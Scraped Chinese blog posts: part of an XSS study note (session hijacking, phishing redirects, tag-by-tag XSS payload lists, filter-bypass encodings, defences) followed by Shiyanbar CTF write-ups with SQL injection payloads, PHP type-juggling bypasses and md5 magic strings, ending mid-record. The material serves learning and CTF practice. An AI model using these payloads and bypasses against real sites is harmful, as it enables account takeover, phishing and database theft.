加载B域时Cookie传入问题       我们知道Cookie分为内存Cookie和本地Cookie，当我们通过A域加载B域时，默认是带内存Cookie加载(如果无内存Cookie则不带)，而如果想要带本地Cookie加载，则本地Cookie必须带P3P属性。 相关文章：用P3P header解决iframe跨域访问cookie 相关阅读：《Web前端黑客技术揭秘》p41-42 会话劫持       由于Cookie的不安全性，开发者们开始使用一些更为安全的认证方式——Session。       这里引用《XSS跨站脚本攻击剖析与防御》p51-52页的内容        Session的中文意思是会话，其实就是访问者从到达特定主页到离开的那段时间，在这个过程中，每个访问者都会得到一个单独的Session。Session是给予访问的进程，记录了一个访问的开始到结束，搭档浏览器或进程关闭之后，Session也就“消失”了。       在Session机制中，客户端和服务端也有被其他人利用的可能。       Session和Cookie最大的区别在于：Session是保存在服务端的内存里面，而Cookie保存于浏览器或客户端文件里面        这里提到Session是因为我们在现实情况中可能会出现已经获取到了Cookie，但是由于用户已经退出了浏览器指示Session无效，导致我们无法通过Cookie欺骗来获取用户权限；又比如有的网站设置了HttpOnly，获取不到Cookie；再者有的网站将Cookie与客户端IP向绑定；此时我们便可以利用会话劫持来达到目的。       会话劫持的实质就是模拟GET/POST请求(带Cookie)通过受害者浏览器发送给服务器，我们可以通过下面的方式来完成。 通过javascript控制DOM对象来发起一个GET请求，如：123var img = document.creatElement(&quot;img&quot;);img.src = &quot;http://www.a.com/del.php?id=1&quot;;document.body.appendChild(img); 通过javascript自动构造隐藏表单并提交(POST) 通过XMLHttpRequest直接发送一个POST请求        我们可以通过构造的GET/POST请求来实现如添加管理员、删除文章、上传文件等操作。XSS蠕虫从某种意义上来说也属于会话劫持。 钓鱼       现在一般我们都可以很容易的防范钓鱼网站，可是当钓鱼网站与XSS漏洞结合呢？设想一下，如mail.qq.com的页面存在XSS漏洞，攻击者通过iframe替换了原来的页面成钓鱼页面，并且网页的Url还是原来的页面，你是否能察觉出来？ XSS重定向钓鱼       即从www.a.com通过xss漏洞跳转到www.b.com的钓鱼页面上，整个过程变化明显，受害者易察觉。1http://www.a.com/index.php?search=&lt;script&gt;document.location.href=&quot;http://www.b.com/index.php&quot;&lt;/script&gt; HTML注入式钓鱼       通过javascript来修改页面的DOM对象属性，或在原页面中添加新的DOM元素。前者相对于后者更隐蔽。 Iframe       攻击者通过javascript来添加一个新的&lt;Iframe&gt;标签嵌入第三方域的内容(钓鱼网页)，此时主页面仍处于正常页面下，具有极高的迷惑性。 5) XSS漏洞的挖掘       就目前而言，XSS漏洞的挖掘主要分为白盒审计和黑盒Fuzz两种。 白盒审计       通过查看源代码来判断网站的交互点是否存在安全过滤。由于此处涉及代码审计内容(其实就是懒)，就细说，这里直接引用书中总结的。 分析源代码挖掘XSS的一般思路是：查找可能在页面输出的变量，检验它们是否受到控制，然后跟踪这些变量的传递过程，分析它们是否被htmlencode()之类的函数过滤 黑盒审计       这个可得好好说说了，毕竟我们在现实环境中挖掘XSS漏洞时黑盒的情况偏多。我们进行XSS黑盒测试时主要分为手工检测和工具检测。 手工检测       首先我们需要尽可能地找到目标的每个输入输出点并挨个尝试；在进行尝试的时候，我们应优先选择特殊字符进行测试，如&quot;&lt;&gt;&amp;;/':等，如果连&lt;&gt;都未过滤/转义，那么该输入点很可能存在XSS漏洞。       如果&lt;&gt;等标记符号都被过滤/转义了，我们也可以使用标签自身的属性/事件(href,lowsrc,bgsound,backgroud,value,action,dynsrc等)来触发XSS,如&lt;input name=&quot;xx&quot; value=&lt;?=$query?&gt;&gt;这里的$query属于动态内容，我们把他替换成恶意代码，最终的代码为&lt;input name=&quot;xx&quot; value=xss onmouseover=evil_script&gt;。       一般来说，针对输入框的黑盒测试可能存在反射型XSS，也可能存在存储型XSS，还有可能是DOM型，针对Url参数的黑盒测试绝大多数只存在反射型XSS或DOM型XSS。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566常见标签&lt;img&gt;标签利用方式1&lt;img src=javascript:alert(&quot;xss&quot;)&gt;&lt;IMG SRC=javascript:alert(String.formCharCode(88,83,83))&gt;&lt;img scr=&quot;URL&quot; style='Xss:expression(alert(/xss));'&lt;!--CSS标记xss--&gt;&lt;img STYLE=&quot;background-image:url(javascript:alert('XSS'))&quot;&gt;XSS利用方式2&lt;img src=&quot;x&quot; onerror=alert(1)&gt;&lt;img src=&quot;1&quot; onerror=eval(&quot;alert('xss')&quot;)&gt;XSS利用方式3&lt;img src=1 onmouseover=alert('xss')&gt;&lt;a&gt;标签标准格式&lt;a href=&quot;https://www.baidu.com&quot;&gt;baidu&lt;/a&gt;XSS利用方式1&lt;a href=&quot;javascript:alert('xss')&quot;&gt;aa&lt;/a&gt;&lt;a href=javascript:eval(alert('xss'))&gt;aa&lt;/a&gt;&lt;a href=&quot;javascript:aaa&quot; onmouseover=&quot;alert(/xss/)&quot;&gt;aa&lt;/a&gt;XSS利用方式2&lt;script&gt;alert('xss')&lt;/script&gt;&lt;a href=&quot;&quot; onclick=alert('xss')&gt;aa&lt;/a&gt;利用方式3&lt;a href=&quot;&quot; onclick=eval(alert('xss'))&gt;aa&lt;/a&gt;利用方式4&lt;a href=kycg.asp?ttt=1000 onmouseover=prompt('xss') y=2016&gt;aa&lt;/a&gt;input标签标准格式&lt;input name=&quot;name&quot; value=&quot;&quot;&gt;利用方式1&lt;input value=&quot;&quot; onclick=alert('xss') type=&quot;text&quot;&gt;利用方式2&lt;input name=&quot;name&quot; value=&quot;&quot; onmouseover=prompt('xss') bad=&quot;&quot;&gt;利用方式4&lt;input name=&quot;name&quot; value=&quot;&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&lt;form&gt;标签XSS利用方式1&lt;form action=javascript:alert('xss') method=&quot;get&quot;&gt;&lt;form action=javascript:alert('xss')&gt;XSS利用方式2&lt;form method=post action=aa.asp? onmouseover=prompt('xss')&gt;&lt;form method=post action=aa.asp? onmouseover=alert('xss')&gt;&lt;form action=1 onmouseover=alert('xss)&gt;XSS利用方式3&lt;!--原code--&gt;&lt;form method=post action=&quot;data:text/html;base64,&lt;script&gt;alert('xss')&lt;/script&gt;&quot;&gt;&lt;!--base64编码--&gt;&lt;form method=post action=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;&lt;iframe&gt;标签XSS利用方式1&lt;iframe src=javascript:alert('xss');height=5width=1000 /&gt;&lt;iframe&gt;XSS利用方式2&lt;iframe src=&quot;data:text/html,&amp;lt;script&amp;gt;alert('xss')&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;&lt;!--原code--&gt;&lt;iframe src=&quot;data:text/html;base64,&lt;script&gt;alert('xss')&lt;/script&gt;&quot;&gt;&lt;!--base64编码--&gt;&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;XSS利用方式3&lt;iframe src=&quot;aaa&quot; onmouseover=alert('xss') /&gt;&lt;iframe&gt;XSS利用方式3&lt;iframe src=&quot;javascript&amp;colon;prompt&amp;lpar;`xss`&amp;rpar;&quot;&gt;&lt;/iframe&gt;svg&lt;&gt;标签&lt;svg onload=alert(1)&gt;iframe&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;&lt;/iframe&gt; ——引自wkend的文章《XSS小节》 工具检测       关于XSS的自动检测软件有许多，如Burp的Scan模块，BruteXSS等，这里不做过多解释。 6) shellcode的绕过绕过XSS-Filter       XSS-Filter是一段基于黑名单的过滤函数，大多数CMS都有这么个函数，作用于用户的每一个输入点，用于过滤可能的恶意代码。不过从某种意义上来说，基于黑名单的保护是一定不会是安全的，由于XSS的多变性，几乎不可能存在完全地过滤。 空格回车和Tab       对XSS-Filter而言，如果仅仅是将函数加入黑名单处理，那么可以在函数名称之中尝试加入空格、回车、Tab等键位符来进行绕过。这是由于在javascript中只会将;作为语句的终止符，当浏览器引擎解析javascript脚本时没有匹配到;便会继续处理，知道发现下个分号为止，而换行符并不是终止符。如下列代码可绕过对关键字javascript|alert的过滤：123&lt;img src=javascript:alert(/xss/)&gt; 对标签属性值进行转码       HTML中属性值支持ASCII码形式，如1&lt;img src=&quot;javascript:alert('xss');&quot;&gt;       替换成1&lt;img src=&quot;javascrip&amp;#116&amp;#58alert('xss');&quot;&gt;       其中在ASCII表中116为t，58为:。       也可以将&amp;#01,&amp;#02等插入javascript的头部，还可以将tab(&amp;#09)|换行符(&amp;#10)|回车键(&amp;#13)插入到代码中的任意位置。 Fuzz标签未过滤事件名       如&lt;img src=x onerror=alert(/xss/)&gt;其中的onerror即为IMG标签的一个事件，通常这样的事件都是以on开头，常见的有:123456789onResumeonReverseonSeekonSynchRestoredonURLFliponRepeatonPauseonstoponmouseover       除此之外还有很多事件可以利用，这里不再一一列举。 使用Css绕过       利用Css样式表可以执行javascript的特性，如       Css直接执行javascript：1234&lt;div style=&quot;background-image:url(javascript:alert('xss'))&quot;&gt;&lt;style&gt; body {background-image:url(&quot;javascript:alert('xss')&quot;);}&lt;/style&gt;       css中使用expression执行javascript:12345&lt;div style=&quot;width: expression(alert('xss'))&quot;&gt;&lt;img src=&quot;#&quot; style=&quot;xss:expression(alert(/xss/))&quot;&gt;&lt;style&gt; body {background-image:expression(&quot;alert('xss')&quot;);}&lt;/style&gt;       在上述的两个例子中，都用到了样式表的url属性来执行XSS代码。       除了上述两种，还可以利用@import直接执行javascript代码123&lt;style&gt; @import 'javascript:alert(&quot;xss&quot;)';&lt;/style&gt;       在现实环境下，HTML页面中的Css与Javascript的嵌入方式很相似，且Css也可以执行javascript代码，故我们的XSS代码也可以通过嵌入远程恶意css文件来进行XSS攻击。 扰乱规则 大小写变换; 利用expression执行跨站代码的时候，可以构造不同的全角字符来扰乱过滤规则; 结合样式表注释字符/**/，通过css执行javascript 样式标签会过滤\\和\\0，可以构造如@i\\mp\\0\\0ort 'jav\\0asc\\0rip\\t:al\\0er\\t(&quot;x\\0ss&quot;)'绕过 Css关键字进行编码处理，如&lt;p style=&quot;xss:\\0065xpression(alert(/xss/))&quot;&gt;其中65为字母e进行unicode编码后的数字部分 利用浏览器解析注释的问题 利用字符编码       javascript支持许多的编码格式，如： unicode escapes 十六|十|八进制 如果能将这些编码格式运用进跨站攻击，无意能大大加强XSS的威力在IE下甚至支持JScript Encode加密后的代码 拆分法       如果一个网站规定了输入的最大长度，但是ShellCode又太长，那么久可以拆分成几个部分，最后在组成起来。相关文章：《疯狂的跨站之行》剑心(非原链接) 7) XSS防御       说了那么多，那我们该如何防御这看似防不胜防的XSS攻击呢？ 输入       严格控制用户可输入的范围，如手机号只能输入数字且长度不能大于11位等，如需输入某些敏感字符的情况下可对数据进行转义处理，对于用户数据的过滤尽可能地采用白名单而不是黑名单。 输出       减少不必要的输出，在需要输出的地方使用HTML编码将敏感字符转义为实体符，javascript进行DOM操作时注意不要将已转义的实体符再次解析成DOM对象。 其他       设置HttpOnly，开启WAF。 写在最后       感谢参考资料中各位分享技术的大牛，小弟才笔有限，仅仅介绍了XSS攻击中的一部分，仍有一部分由于种种原因我没有写进来。比如整篇文章都是Javascript，实际上在遇到XSS问题时我们还需考虑VBscript、Actionscript等等，还有许多优秀的案例由于篇幅问题无法写上了，可能会导致部分读者理解不全面，在这里向大家说声抱歉，我会在下面的参考中列出我参考的书籍与文章供各位读者查看。XSS的学习暂时放下了，下一站——SQL注入，虽然对此有些浅显的认知，但还是希望能系统的学一遍，可能会在下个月发出来，感兴趣的读者可以关注我的博客(www.0x002.com)。 参考资料书籍：《Web前端黑客技术揭秘》《XSS跨站脚本攻击剖析与防御》《白帽子讲Web安全》《黑客攻防技术宝典Web实战篇》第二版文章：XSS小结浅说 XSS 和 CSRFSession攻击手段(会话劫持/固定)及其安全防御措施 附录https://github.com/ChrisLinn/greyhame-2017/blob/master/skills/web.md 2017灰袍技能精华https://github.com/rajeshmajumdar/BruteXSS BruteXSShttps://github.com/beefproject/beef Beef神器https://github.com/1N3/XSSTracer 用于检查跨站点跟踪的小型python脚本https://github.com/0x584A/fuzzXssPHP 一个非常简单的反射XSS扫描仪支持GET/POSThttps://github.com/chuhades/xss_scan 反射xss扫描器https://github.com/BlackHole1/autoFindXssAndCsrf 浏览器的插件，它自动检查页面是否具有xss和漏洞https://github.com/shogunlab/shuriken xss命令行工具用于测试web应用程序中xss负载列表https://github.com/UltimateHackers/XSStrike 用于XSS、WAF检测和旁路的模糊和蛮力参数https://github.com/stamparm/DSXS 一个完全功能的跨站点脚本漏洞扫描器，支持获取和发布参数，并写入100行代码","link":"/2019/%E5%89%8D%E7%AB%AFHack%E4%B9%8BXSS%E6%94%BB%E5%87%BB%E4%B8%AA%E4%BA%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"title":"百道CTF刷题记录(一)之实验吧","text":"简介最近在刷CTF题，主攻Web，兼职Misc Shiyanbar0x01 简单的登陆题简单概括： 考点： %00截断正则 CBC字节翻转攻击 难度： 难 WP：https://blog.csdn.net/include_heqile/article/details/79942993 解题过程：F12查看响应头，发现返回tips 访问test.php文件得到源代码：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576&lt;?phpdefine(&quot;SECRET_KEY&quot;, '***********');define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);error_reporting(0);include('conn.php');function sqliCheck($str){ if(preg_match(&quot;/\\\\\\|,|-|#|=|~|union|like|procedure/i&quot;,$str)){ return 1; } return 0;}function get_random_iv(){ $random_iv=''; for($i=0;$i&lt;16;$i++){ $random_iv.=chr(rand(1,255)); } return $random_iv;}function login($info){ $iv = get_random_iv(); $plain = serialize($info); $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv); setcookie(&quot;iv&quot;, base64_encode($iv)); setcookie(&quot;cipher&quot;, base64_encode($cipher));}function show_homepage(){ global $link; if(isset($_COOKIE['cipher']) &amp;&amp; isset($_COOKIE['iv'])){ $cipher = base64_decode($_COOKIE['cipher']); $iv = base64_decode($_COOKIE[&quot;iv&quot;]); if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)){ $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode('&quot;.base64_encode($plain).&quot;') can't unserialize&lt;/p&gt;&quot;); $sql=&quot;select * from users limit &quot;.$info['id'].&quot;,0&quot;; $result=mysqli_query($link,$sql); if(mysqli_num_rows($result)&gt;0 or die(mysqli_error($link))){ $rows=mysqli_fetch_array($result); echo '&lt;h1&gt;&lt;center&gt;Hello!'.$rows['username'].'&lt;/center&gt;&lt;/h1&gt;'; } else{ echo '&lt;h1&gt;&lt;center&gt;Hello!&lt;/center&gt;&lt;/h1&gt;'; } }else{ die(&quot;ERROR!&quot;); } }}if(isset($_POST['id'])){ $id = (string)$_POST['id']; if(sqliCheck($id)) die(&quot;&lt;h1 style='color:red'&gt;&lt;center&gt;sql inject detected!&lt;/center&gt;&lt;/h1&gt;&quot;); $info = array('id'=&gt;$id); login($info); echo '&lt;h1&gt;&lt;center&gt;Hello!&lt;/center&gt;&lt;/h1&gt;';}else{ if(isset($_COOKIE[&quot;iv&quot;])&amp;&amp;isset($_COOKIE['cipher'])){ show_homepage(); }else{ echo '&lt;body class=&quot;login-body&quot; style=&quot;margin:0 auto&quot;&gt; &lt;div id=&quot;wrapper&quot; style=&quot;margin:0 auto;width:800px;&quot;&gt; &lt;form name=&quot;login-form&quot; class=&quot;login-form&quot; action=&quot;&quot; method=&quot;post&quot;&gt; &lt;div class=&quot;header&quot;&gt; &lt;h1&gt;Login Form&lt;/h1&gt; &lt;span&gt;input id to login&lt;/span&gt; &lt;/div&gt; &lt;div class=&quot;content&quot;&gt; &lt;input name=&quot;id&quot; type=&quot;text&quot; class=&quot;input id&quot; value=&quot;id&quot; onfocus=&quot;this.value=\\'\\'&quot; /&gt; &lt;/div&gt; &lt;div class=&quot;footer&quot;&gt; &lt;p&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot; class=&quot;button&quot; /&gt;&lt;/p&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt;'; }}?&gt;代码分析： sqliCheck函数负责过滤sql注入 get_random_iv 生成16位随机数(Asicc范围在0~255内)iv 漏洞原因：aes-128-cbc加密存在CBC翻转攻击(不理解，暂时跳过) 0x02 后台登录简单概括： 考点：md5()函数16位二进制格式绕过，md5(&quot;ffifdyop&quot;,True)得到的加密字符串为'or'6&lt;crash&gt;(注：or '数字+字母' 等价于or true) 难度：易 WP：https://blog.csdn.net/qq_36791003/article/details/81746730 解题过程：打开网页，右键查看源代码发现源码：123456789&lt;!-- $password=$_POST['password'];$sql = &quot;SELECT * FROM admin WHERE username = 'admin' and password = '&quot;.md5($password,true).&quot;'&quot;;$result=mysqli_query($link,$sql); if(mysqli_num_rows($result)&gt;0){ echo 'flag is :'.$flag; } else{ echo '密码错误!'; } --&gt;上网查了下，了解到md5($password,true)返回的是原始 16 字符二进制格式的密文,返回的内容可以存在单引号，故我们可以找个字符串，使其md5(str,true)加密过返回的字符串与原sql语句拼接造成SQL注入攻击。经过简单的Fuzz,我们知道：字符串'or'6&lt;乱码&gt;&quot;，此时如果拼接到sql语句中，那么这条语句将会变成一条永真式，因此成功登录，获得flag。 0x03 加了料的报错注入简单概括： 考点：双参数注释绕过，=被过滤可用regexp 'xxx'和in (0xaaaa)代替 难度： 中 WP：https://www.jianshu.com/p/95f18a32ec7b 解题过程：观察题目可知此题考的是报错注入，右键源代码得到提升：Post发送username&amp;password。sql语句如下：1$sql=&quot;select * from users where username='$username' and password='$password'&quot;;注意：此处可控的参数有两个。简单手工测试，发现过滤了#，and等关键字，而且username处单独过滤了右括号，这意味着我们无法再username出使用函数，因而我们将目光转向password。经过一番人工Fuzz，发现只有exp()函数没有被过滤，故我们构造语句：exp(~(select * from(select user())a))成功爆出用户名。最终我们的payload如下：12345678username=a'/*&amp;password=*/Or exp(~(select * from(select database())a))or'1 //查询当前数据库username=a'/*&amp;password=*/Or exp(~(select * from(select group_concat(table_name) from information_schema.tables where table_schema regexp 'error_based_hpf')a))or'1 //查询表名，此处由于=被过滤，我们使用regexp来绕过username=a'/*&amp;password=*/Or exp(~(select * from(select group_concat(column_name) from information_schema.columns where table_name regexp 'ffll44jj')a))or'1//查询列名，此处由于and被过滤，故而不加数据库名的验证，在实际渗透中最好还是尽量加上。username=a'/*&amp;password=*/Or exp(~(select * from(select group_concat(value) from ffll44jj)a))or'1//获取flag 0x04 认真一点！简单概括： 考点：双层叠加绕过过滤，大小写绕过，from()for()代替偏移，布尔盲注 难度：难 WP：https://blog.csdn.net/xingyyn78/article/details/79747404 解题过程：打开网页，随便输入个数字，页面返回You are in...，输入在数字后加单引号，返回You are not in...。猜测此处考的是bool盲注，根据页面返回的内容判断真假。经过一番简单的fuzz，发现此处过滤的函数只会过滤一次，那么我们可以将过滤关键词双写：oorr就好了。1234id=aaa'oorr(1=1)='1 //返回You are inid=aaa'oorr(1=2)='1 //返回You are not in// 此处的aaa是为了让前边条件为假，那么sql语句的判断将依赖于后边的语句// 即：false ∪ (条件一) = 条件一我们先判断数据库长度：1id=aaa'oorr(length(database())&gt;1)='1其次循环取数据库名进行判断：12id=aaa'oorr(mid((select+database())from(1)foorr(1))='c')='1 //由于,被过滤，使用from与for进行绕过，记得for要写成foorr绕过过滤，+号绕过空格过滤接着循环判断表名：1id=aaa'oorr(mid((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database()))from(1)foorr(1))='a')='1之后就不写了，与上边类似，写脚本跑就好。 0x05 你真的会PHP吗？简单概括： 考点：is_numeric函数的绕过(%20|%00)、PHP32位系统整数型变量最大值为：2147483647(2^31-1) 64位：9223372036854775807(2^63-1) 难度：中 WP：https://blog.csdn.net/JBlock/article/details/78745513 解题过程：打开题目，发现返回头存在提示信息：打开链接获得源码：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?php$info = &quot;&quot;; $req = [];$flag=&quot;xxxxxxxxxx&quot;;ini_set(&quot;display_error&quot;, false); error_reporting(0); if(!isset($_POST['number'])){ header(&quot;hint:6c525af4059b4fe7d8c33a.txt&quot;); die(&quot;have a fun!!&quot;); }foreach([$_POST] as $global_var) { foreach($global_var as $key =&gt; $value) { $value = trim($value); is_string($value) &amp;&amp; $req[$key] = addslashes($value); } } function is_palindrome_number($number) { $number = strval($number); $i = 0; $j = strlen($number) - 1; while($i &lt; $j) { if($number[$i] !== $number[$j]) { return false; } $i++; $j--; } return true; } if(is_numeric($_REQUEST['number'])){ $info=&quot;sorry, you cann't input a number!&quot;;}elseif($req['number']!=strval(intval($req['number']))){ $info = &quot;number must be equal to it's integer!! &quot;; }else{ $value1 = intval($req[&quot;number&quot;]); $value2 = intval(strrev($req[&quot;number&quot;])); if($value1!=$value2){ $info=&quot;no, this is not a palindrome number!&quot;; }else{ if(is_palindrome_number($req[&quot;number&quot;])){ $info = &quot;nice! {$value1} is a palindrome number!&quot;; }else{ $info=$flag; } }}echo $info;?&gt;代码流程：is_numeric[false] &amp;&amp; $req['number']!=strval(intval($req['number']))[false]-&gt; $value1!=$value2[false]-&gt; is_palindrome_number($req[&quot;number&quot;])[true] 我们知道is_numeric函数与ereg函数一样，存在截断漏洞，而第二个if判断存在弱类型比较的漏洞，我们将这两个漏洞组合起来打一套组合拳。PHP语言对于32位系统的int变量来说，最大值是2147483647，如果我们传入的数值为2147483647的话，经过strrev函数反转再转成int函数仍是2147483647，因为746384741&gt;2147483647，转成int变量会减小成2147483647，故而绕过看似矛盾的条件。而对于开始的is_numeric，加上%00或%20即可，此时is_numeric函数便不会认为这是个数字，而对于下边的strval()in、intval()却无影响。综上所述，我们的number应为：2147483647%00、2147483647%20、%002147483647。 此处%20不能再开头的原因是intval()会将其转换成数字0，而%00无影响。 0x06 登陆一下好吗??简单概括： 考点：登录框万能密码 难度：中 WP：https://blog.csdn.net/h1012946585/article/details/79851884 解题过程：打开页面，猜测考的是万能密码，手动Fuzz发现过滤了or，故改用'='成功。 0x07 who are you?简单概括： 考点：时间盲注，and case when () then () else () end绕过逗号过滤。 难度：中 WP：https://blog.csdn.net/wy_97/article/details/75643252 解题过程：抓包，发现回显的数据貌似是直接取header的值，没有经过数据库，使用报错注入失败，猜测是盲注，由于bool盲注返回的页面一致，故此题应为时间盲注：简单测试发现逗号被过滤，导致我们无法使用if语句，不过我们可以换成case when then else语句代替： X-Forwarded-For: 127.0.0.1’and case when(length(database())&gt;1)then(sleep(5))else(sleep(0))end and ‘1 剩下的就是写脚本慢慢跑了，此处略过。 0x08 因缺思汀的绕过简单概括： 考点：gourp by xxx with rollup limit 1 offset x#【创建虚拟表最后一行为pwd的值为NULL，借用offset偏移到最后一个，post传输空的pwd，满足条件】 难度：中 WP：https://blog.csdn.net/qq_35078631/article/details/54772798 解题过程：右键源代码得到提示信息source.txt，打开得到源码。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;?phperror_reporting(0);if (!isset($_POST['uname']) || !isset($_POST['pwd'])) { echo '&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;'.&quot;&lt;br/&gt;&quot;; echo '&lt;input name=&quot;uname&quot; type=&quot;text&quot;/&gt;'.&quot;&lt;br/&gt;&quot;; echo '&lt;input name=&quot;pwd&quot; type=&quot;text&quot;/&gt;'.&quot;&lt;br/&gt;&quot;; echo '&lt;input type=&quot;submit&quot; /&gt;'.&quot;&lt;br/&gt;&quot;; echo '&lt;/form&gt;'.&quot;&lt;br/&gt;&quot;; echo '&lt;!--source: source.txt--&gt;'.&quot;&lt;br/&gt;&quot;; die;}function AttackFilter($StrKey,$StrValue,$ArrReq){ if (is_array($StrValue)){ $StrValue=implode($StrValue); } if (preg_match(&quot;/&quot;.$ArrReq.&quot;/is&quot;,$StrValue)==1){ print &quot;水可载舟，亦可赛艇！&quot;; exit(); }}$filter = &quot;and|select|from|where|union|join|sleep|benchmark|,|\\(|\\)&quot;;foreach($_POST as $key=&gt;$value){ AttackFilter($key,$value,$filter);}$con = mysql_connect(&quot;XXXXXX&quot;,&quot;XXXXXX&quot;,&quot;XXXXXX&quot;);if (!$con){ die('Could not connect: ' . mysql_error());}$db=&quot;XXXXXX&quot;;mysql_select_db($db, $con);$sql=&quot;SELECT * FROM interest WHERE uname = '{$_POST['uname']}'&quot;;$query = mysql_query($sql); if (mysql_num_rows($query) == 1) { $key = mysql_fetch_array($query); if($key['pwd'] == $_POST['pwd']) { print &quot;CTF{XXXXXX}&quot;; }else{ print &quot;亦可赛艇！&quot;; }}else{ print &quot;一颗赛艇！&quot;;}mysql_close($con);?&gt;阅读源码可知，我们需要让数据库返回的pwd字段与我们post的内容相同，注意此处是弱类型比较。我们知道grou by with roolup 将创建个虚拟表，且表的最后一行pwd字段为Null。 mysql&gt; create table test ( -&gt; user varchar(100) not null, -&gt; pwd varchar(100) not null);mysql&gt;insert into test values(“admin”,”mypass”);mysql&gt;select from test group by pwd with rollupmysql&gt; select from test group by pwd with rollup;+——-+————+| user | pwd |+——-+————+| guest | alsomypass || admin | mypass || admin | NULL |+——-+————+3 rows in setmysql&gt; select from test group by pwd with rollup limit 1;+——-+————+| user | pwd |+——-+————+| guest | alsomypass |+——-+————+mysql&gt; select from test group by pwd with rollup limit 1 offset 0;+——-+————+| user | pwd |+——-+————+| guest | alsomypass |+——-+————+1 row in setmysql&gt; select from test group by pwd with rollup limit 1 offset 1;+——-+——–+| user | pwd |+——-+——–+| admin | mypass |+——-+——–+1 row in setmysql&gt; select from test group by pwd with rollup limit 1 offset 2;+——-+——+| user | pwd |+——-+——+| admin | NULL |+——-+——+1 row in set 构造payload:uname=1' or true group by pwd with rollup limit 1 offset 2#&amp;pwd=offset 2为偏移两个数据，即第三行的pwd字段为空。 0x09 简单的sql注入之3简单概括： 考点：mysql报错注入 难度：易 WP：https://www.cnblogs.com/caizhiren/p/7846917.html 解题过程：exp函数报错一把嗦 0x0A 简单的sql注入之2简单概括： 考点：空格过滤 难度：易 WP：https://www.cnblogs.com/caizhiren/p/7862466.html 解题过程：简单Fuzz发现过滤了空格，使用内敛注释一把嗦。1/**/select/**/group_concat(table_name)/**/from/**/information_schema.tables=database() 0x0B 简单的sql注入之1简单概括： 考点：双层叠加绕过 难度：易 WP：https://www.jianshu.com/p/5d37d33854e3 解题过程1selectselect 0x0C 天下武功唯快不破简单概括： 考点：脚本工具的编写 难度：易 WP：无 解题过程：12345import requests,base64r = requests.get('http://ctf5.shiyanbar.com/web/10/10.php')key=base64.b64decode(r.headers['FLAG'])[-9:]r = requests.post('http://ctf5.shiyanbar.com/web/10/10.php',data={'key':key})print(r.text) 0x0D 让我进去简单概括： 考点：hash长度拓展攻击 难度：难 WP：http://www.0x002.com/2018/CTF%E5%AE%9E%E9%AA%8C%E5%90%A7%E8%AE%A9%E6%88%91%E8%BF%9B%E5%8E%BBwriteup/ 0x0E 拐弯抹角简单概括： 考点：index.php/index.php 难度：易 WP：无 解题过程：1index.php/index.php 0X0F Forms简单概括： 考点：不清楚，过于简单 难度：无 WP：无 0x10 天网管理系统简单概括： 考点：PHP==弱类型比较，PHP序列化与反序列化 难度：易 WP：http://www.cnblogs.com/ssooking/p/5877086.html 解题过程：右键查看源代码发现部分源码 ：我们知道0e开头的字符串在与数字0做弱类型比较时会先转成数值0在比较，故：我们只要输入一个经md5加密后密文为0e开头的字符串即可。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s1885207154a0e509367213418206700842008763514s1502113478a0e861580163291561247404381396064s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s155964671a0e342768416822451524974117254469s1184209335a0e072485820392773389523109082030s1665632922a0e731198061491163073197128363787s1502113478a0e861580163291561247404381396064s1836677006a0e481036490867661113260034900752s1091221200a0e940624217856561557816327384675s155964671a0e342768416822451524974117254469s1502113478a0e861580163291561247404381396064s155964671a0e342768416822451524974117254469s1665632922a0e731198061491163073197128363787s155964671a0e342768416822451524974117254469s1091221200a0e940624217856561557816327384675s1836677006a0e481036490867661113260034900752s1885207154a0e509367213418206700842008763514s532378020a0e220463095855511507588041205815s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s214587387a0e848240448830537924465865611904s1502113478a0e861580163291561247404381396064s1091221200a0e940624217856561557816327384675s1665632922a0e731198061491163073197128363787s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s1665632922a0e731198061491163073197128363787s878926199a0e545993274517709034328855841020 0x11 忘记密码了简单概括： 考点：vim源码泄露 难度：中 WP：.submit.php.swp 解题过程：打开题目，观察源码，发现管理员邮箱：admin@simplexue.com，随便输入一个内容提交，显示step2.php，尝试访问step2.php，网页被重定向且返回html源码，发现存在submit.php文件，猜测存在swp源码泄露，访问.submit.php.swp文件得到部分源码。 12345678910111213141516171819202122232425262728293031323334353637383940414243........这一行是省略的代码......../*如果登录邮箱地址不是管理员则 die()数据库结构---- 表的结构 `user`--CREATE TABLE IF NOT EXISTS `user` ( `id` int(11) NOT NULL AUTO_INCREMENT, `username` varchar(255) NOT NULL, `email` varchar(255) NOT NULL, `token` int(255) NOT NULL DEFAULT '0', PRIMARY KEY (`id`)) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;---- 转存表中的数据 `user`--INSERT INTO `user` (`id`, `username`, `email`, `token`) VALUES(1, '****不可见***', '***不可见***', 